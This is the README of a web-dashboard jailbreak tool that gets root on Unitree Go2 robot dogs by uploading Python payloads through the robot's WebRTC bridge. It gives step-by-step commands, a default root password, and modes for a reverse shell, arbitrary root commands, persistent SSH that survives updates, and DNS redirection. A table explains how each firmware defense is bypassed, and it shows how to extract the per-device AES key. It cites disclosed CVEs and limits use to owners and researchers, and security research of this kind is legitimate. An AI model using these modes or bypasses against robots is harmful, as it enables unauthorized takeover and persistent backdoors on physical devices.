<div align="center">
 
**Root access for the Unitree Go2.**

**Firmware 1.1.7 – 1.1.13: Confirmed working**

**Firmware 1.1.14/15: Payload verified, end-to-end pending**

<img width="1383" height="792" alt="Screenshot 2026-06-09 at 8 29 12 AM" src="https://github.com/user-attachments/assets/acee88a4-658c-422d-a045-decbf057eca0" />
</div>

UnLeash Lite is a web-based jailbreak tool for the Unitree Go2 robot dog. It connects to the robot over its WebRTC data channel, uploads payloads, and triggers execution as root — all from a browser dashboard.

## Install

```bash
pip install .
```

## Dashboard

Launch the web dashboard:

```bash
unleash-lite serve
```

Then open [http://localhost:8443](http://localhost:8443) in your browser.

The dashboard provides:

- **Command & Control** — Live event feed, host management, and one-click jailbreak execution
- **Payloads** — All 9 jailbreak modes with firmware compatibility tags and parameter requirements
- **Cloud Intel** — Unitree cloud login to retrieve per-device AES keys (firmware >= 1.1.15)

Options:

```
unleash-lite serve [--port PORT] [--password SECRET] [--host ADDR]
```

Set `--password` to require authentication on the dashboard.

## Quick Start

### Firmware <= 1.1.13

1. Open the dashboard and select **ssh** mode
2. Set trigger mode to **Auto** and click **Execute**
3. Wait for the callback confirmation in the live feed, then:

```bash
ssh root@192.168.123.161   # password: unleash
```

### Firmware 1.1.14 (no AES key)

1. Select **bypass-ssh** mode (or click **Quick SSH**)
2. Choose a trigger mode:
   - **Auto** — the tool sends a fake controller hotkey press to trigger execution (experimental; may not fire on all boards)
   - **Manual** — after the payload uploads, press **L1+A** on your physical controller to execute
3. Click **Execute** and wait up to 60 seconds for the cron job to fire
4. SSH in:

```bash
ssh root@192.168.123.161   # password: unleash
```

### Firmware 1.1.15+ (AES key required)

1. Go to the **Cloud Intel** tab, log in with your Unitree account, and click **Use** next to your robot's AES key — this loads the key into the connect dialog
2. Select **bypass-ssh**, choose your trigger mode, and execute
3. Wait up to 60 seconds, then SSH in

### CLI

```bash
unleash-lite ssh                                        # firmware <= 1.1.13
unleash-lite bypass-ssh                                 # firmware 1.1.14
unleash-lite bypass-ssh --aes-key <32-hex-char-key>     # firmware 1.1.15+
```

## Firmware Support

| Firmware | Mode | AES Key? | Status |
|----------|------|----------|--------|
| <= 1.1.13 | `ssh` | No | Confirmed |
| 1.1.14 | `bypass-ssh` | No | Payload writes verified; trigger pending |
| >= 1.1.15 | `bypass-ssh --aes-key KEY` | Yes | Payload writes verified; trigger pending |

## Modes

### Standard (firmware <= 1.1.13)

| Mode | Description |
|------|-------------|
| `ssh` | Enable SSH and set root password |
| `ssh-persist` | Persistent SSH with guard service (survives reboots and OTA) |
| `custom` | Run any shell command as root |
| `reverse-shell` | Reverse shell to a specified IP |

### Bypass (firmware >= 1.1.14)

These modes bypass the keyword blocklist and seccomp sandbox added in `programming_actuator` 1.0.5.5.

| Mode | Description |
|------|-------------|
| `bypass-ssh` | Enable SSH via cron job (recommended for all firmware) |
| `bypass-hosts` | Write MQTT DNS redirect to `/etc/hosts` |
| `bypass-file` | Write arbitrary file content |
| `bypass-cron` | Install a cron job for command execution |
| `bypass-escalate` | Two-press self-overwrite for unfiltered Python execution |

## Fetching the AES Key (firmware >= 1.1.15)

Use the **Cloud Intel** tab in the dashboard, or from the CLI:

```bash
unleash-lite fetch-key --email you@example.com
```

If you already have SSH access:

```bash
ssh root@192.168.123.161 'xxd -p /unitree/etc/key/aes_key.bin'
```

## How It Works

The Go2's `webrtc_bridge` service sits inside the DDS security perimeter with valid credentials. It bridges between the WebRTC data channel and the internal DDS bus, forwarding messages in both directions without filtering topics or message types.

UnLeash Lite exploits this by:

1. Connecting to the HTTP signaling endpoint (port 9991) and establishing a WebRTC data channel
2. Uploading a Python payload to `programming_actuator` via the bridge
3. Triggering execution — either automatically via a fake controller hotkey press, or manually by the user pressing **L1+A** on a physical controller
4. The payload runs as root

No DDS multicast, no CycloneDDS dependency.

### Firmware Defenses

| Defense | Added in | How it's bypassed |
|---------|----------|-------------------|
| DDS Security (PKI-DH) | ~1.1.x | WebRTC bridge is inside the perimeter |
| Keyword blocklist | 1.1.14 | `str(bytes([...]))` encoding + `np.savetxt` for file I/O |
| seccomp sandbox | 1.1.14 | Write to `/etc/cron.d/`, crond runs outside sandbox |
| UUID validation | 1.1.14 | `str(int(time.time()))` produces valid 10-digit UUIDs |
| Per-device AES auth | 1.1.15 | Key retrievable from Unitree cloud API |
| PAM clock skew (stale RTC) | 1.1.14+ | Patch `/etc/pam.d/cron` with `pam_permit.so` before installing cron job |

## CLI Reference

```bash
unleash-lite <mode> [options]
unleash-lite serve [--port 8443] [--password SECRET]
unleash-lite fetch-key --email EMAIL [--sn SERIAL]
unleash-lite probe [--aes-key KEY] [--debug]
unleash-lite trigger [--robot-ip IP] [--via bridge|dds]
```

Common options:

```
--robot-ip IP         Robot IP (default: 192.168.123.161)
--aes-key KEY         Per-device AES-128 key for firmware >= 1.1.15
--hotkey HOTKEY        Controller hotkey binding (default: L1+Y)
--password PASS       Root password for ssh modes (default: unleash)
--debug               Enable debug logging
```

## Acknowledgments

This tool builds on publicly disclosed security research by multiple independent teams.

**Olivier Laflamme (Boschko) and Ruikai Peng** discovered that `programming_actuator` executes arbitrary Python as root with no authentication ([CVE-2026-27509](https://nvd.nist.gov/vuln/detail/CVE-2026-27509)). Their writeup at [boschko.ca](https://boschko.ca/unitree-go2-rce/) documents the DDS attack chain.

**Andreas Makris (Bin4ry), Kevin Finisterre (h0stile), and Konstantin Severov (legion1581)** disclosed the broader Unitree security architecture weaknesses ([CVE-2025-35027](https://nvd.nist.gov/vuln/detail/CVE-2025-35027), [arXiv:2509.14139](https://arxiv.org/abs/2509.14139)). legion1581's [`unitree_webrtc_connect`](https://github.com/legion1581/unitree_webrtc_connect) was foundational for the WebRTC data channel implementation.

## Legal

This software is provided for **security research, education, and right-to-repair purposes only**. By using it, you agree that:

- You own the robot you are targeting, or have explicit written authorization from its owner.
- You are solely responsible for complying with all applicable local, state, national, and international laws.
- The authors and contributors accept no liability for damages, legal consequences, or misuse arising from this software.

## License

MIT
